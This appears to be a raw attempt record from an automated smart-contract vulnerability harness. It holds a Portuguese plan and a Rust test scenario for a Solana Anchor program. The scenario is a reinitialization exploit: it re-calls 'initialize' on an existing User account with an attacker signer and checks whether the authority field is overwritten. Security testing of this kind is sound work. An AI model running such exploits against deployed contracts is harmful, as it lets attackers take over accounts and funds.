attempts.raw:
{
  "plan": "Preparo uma conta `user` com dados de um `User` cujo authority e a chave legitima, e uma authority legitima. O baseline chama `initialize` com essa authority, provando que o cenario esta correto. O ataque chama `initialize` novamente com a mesma conta `user` ja inicializada, mas passando a authority do atacante como signer. O efeito mede se o campo authority da conta `user` foi sobrescrito com a chave do atacante.",
  "scenario": "let legit_authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

let user_data = anchor_account_data("User", &(legit_authority,));
let user_account = account(&env.program_id, &user_data, None);

let metas = vec![
    AccountMeta::new(user_account_key, false),
    AccountMeta::new_readonly(legit_authority, true),
];

let ix = env.anchor_ix("initialize", &(), metas);
let contas = vec![
    (user_account_key, user_account.clone()),
    (legit_authority, wallet(1_000_000_000)),
];

let r = env.baseline("initialize legitimo", &ix, &contas);

let user_after_baseline = after(&r, &user_account_key).clone();

let attack_metas = vec![
    AccountMeta::new(user_account_key, false),
    AccountMeta::new_readonly(attacker, true),
];
let attack_ix = env.anchor_ix("initialize", &(), attack_metas);
let attack_contas = vec![
    (user_account_key, user_after_baseline),
    (attacker, wallet(1_000_000_000)),
];

let ar = env.attack("reinitialize com authority do atacante", &attack_ix, &attack_contas);

if ar.program_result == ProgramResult::Success {
    let authority_apos = read_pubkey(after(&ar, &user_account_key).data(), 8);
    env.effect("authority da conta user foi sobrescrito com a chave do atacante", authority_apos == attacker);
}"
}

